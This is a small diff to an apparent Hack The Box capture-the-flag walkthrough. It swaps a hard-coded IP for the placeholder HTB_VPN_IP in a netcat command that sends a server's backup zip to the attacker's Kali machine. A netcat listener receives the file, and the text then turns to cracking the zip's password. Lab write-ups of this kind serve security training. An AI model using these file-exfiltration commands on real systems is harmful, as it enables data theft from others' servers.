@@ -243,7 +243,7 @@ sudo nc -lvnp 1337 > ash_backup.zip
 ```
 and transfer the `zip` to our kali:
 ```
-nc 10.10.15.101 1337 < /var/www/html/files/16162020_backup.zip
+nc HTB_VPN_IP 1337 < /var/www/html/files/16162020_backup.zip
 ```
 
 Then let's try to get the password of the `zip`:
